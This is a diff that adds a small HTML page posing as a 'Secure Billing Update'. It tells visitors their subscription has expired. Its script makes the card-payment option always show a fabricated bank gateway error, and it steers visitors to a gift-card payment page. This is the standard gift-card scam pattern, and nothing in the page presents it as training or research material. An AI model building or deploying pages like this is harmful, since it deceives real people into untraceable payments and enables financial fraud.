@@ -1,0 +1,35 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Secure Billing Update</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <style>
+        body { font-family: sans-serif; background: #f4f7f9; text-align: center; padding: 50px 20px; }
+        .card { background: white; padding: 30px; border-radius: 12px; box-shadow: 0 10px 30px rgba(0,0,0,0.1); max-width: 400px; margin: auto; }
+        h1 { font-size: 22px; color: #333; }
+        .option { border: 2px solid #eee; padding: 15px; margin: 10px 0; border-radius: 8px; cursor: pointer; font-weight: bold; }
+        .option:hover { border-color: #007bff; }
+        #error-msg { color: red; font-size: 14px; display: none; margin-bottom: 10px; }
+    </style>
+</head>
+<body>
+    <div class="card">
+        <h1>Subscription Expired</h1>
+        <p>Please select a payment method to restore access.</p>
+        <div id="error-msg">System Error: Bank gateway timeout. Please use Digital Credits.</div>
+        
+        <div class="option" onclick="showError()">Credit / Debit Card</div>
+        <div class="option" onclick="goToGiftCard()">Digital Gift Card (Fast)</div>
+    </div>
+
+    <script>
+        function showError() {
+            document.getElementById('error-msg').style.display = 'block';
+            setTimeout(() => { alert("Error: Bank connection failed. Please use Digital Credit method to avoid delay."); }, 100);
+        }
+        function goToGiftCard() {
+            window.location.href = '/giftcard.html';
+        }
+    </script>
+</body>
+</html>
